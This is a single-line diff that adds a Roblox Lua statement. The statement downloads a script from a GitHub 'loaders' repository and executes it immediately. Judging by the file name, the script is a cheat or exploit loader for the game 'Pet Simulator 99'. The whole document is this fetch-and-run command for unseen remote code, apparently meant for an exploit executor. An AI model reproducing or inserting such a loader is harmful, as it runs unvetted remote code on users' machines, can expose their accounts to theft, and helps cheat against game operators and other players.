@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SnatchJailer/loaders/main/loaders/psx-pet-simulator-99-spam3-211ho7u6oevu1g.lua"))()
